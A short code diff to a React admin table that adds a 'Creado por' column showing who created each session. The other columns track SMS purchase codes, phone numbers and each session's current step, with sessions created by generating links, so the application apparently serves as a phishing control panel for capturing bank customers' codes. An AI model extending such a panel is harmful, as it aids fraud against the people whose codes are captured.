@@ -450,13 +450,14 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">SMS COMPRA</th>
                 <th className="p-3 text-left">Celular</th>
                 <th className="p-3 text-left">Paso actual</th>
+                <th className="p-3 text-left">Creado por</th>
                 <th className="p-3 text-left">Acciones</th>
               </tr>
             </thead>
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={11} className="p-4 text-center text-gray-400">
+                  <td colSpan={12} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -505,6 +506,9 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {/* Convert pasoActual to a more readable format */}
                     {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
+                  </td>
+                  <td className="p-3 text-[#ccc]">
+                    {session.createdBy || '--'}
                   </td>
                   <td className="p-3 text-[#ccc]">
                     <div className="flex space-x-1">
